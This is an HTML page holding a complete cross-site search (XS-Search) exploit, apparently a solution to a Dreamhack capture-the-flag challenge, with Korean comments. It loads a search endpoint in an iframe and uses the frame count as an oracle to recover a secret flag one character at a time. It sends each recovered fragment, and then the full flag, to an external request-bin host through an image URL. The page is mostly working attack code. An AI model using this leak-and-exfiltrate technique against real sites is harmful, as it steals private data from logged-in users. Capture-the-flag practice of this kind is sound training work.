<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>XS-Search Exploit</title>
  </head>
  <body>
    <iframe id="iframe"></iframe>
    <img id="img" />
    <script>
      const iframe = document.getElementById("iframe");
      const img = document.getElementById("img");

      async function req(url) {
        // 지정한 주소의 프레임을 만들어 띄운다.
        return await new Promise((resolve, reject) => {
          iframe.src = url;

          iframe.onload = () => {
            // 그 안에 프레임이 있으면 검색 성공, 없으면 실패
            try {
              if (iframe.contentWindow.frames.length != 0) return resolve();
              else return reject();
            } catch (e) {
              // 뭔가 예외가 나면 실패로 취급
              return reject();
            }
          };
        });
      }

      async function search(query) {
        // 요청을 보내고 그 결과 확인하기
        // ★ 답지와 최대한 동일하게: localhost 사용, 인코딩 안 함
        try {
          await req(`http://localhost:8000/search?query=${query}`);
          return true;
        } catch (e) {
          return false;
        }
      }

      async function exploit() {
        let chars = "0123456789abcdef}";
        let secret = "DH{"; // 플래그 형식. 현재까지 찾은 것들을 계속 이어붙인다.

        while (!secret.includes("}")) {
          // 플래그의 마지막 글자까지 나오면 종료
          for (let c of chars) {
            const candidate = secret + c;

            if (await search(candidate)) {
              secret += c;

              // 한 글자 검색이 성공할 때마다 Request Bin으로 전송
              img.src =
                "https://mcaoeux.request.dreamhack.games/" +
                encodeURIComponent(secret);

              console.log("FOUND:", secret);
              break;
            }
          }
        }

        // 마지막으로 한 번 더 전체 FLAG 전송
        img.src =
          "https://mcaoeux.request.dreamhack.games/final_" +
          encodeURIComponent(secret);
      }

      exploit();
    </script>
  </body>
</html>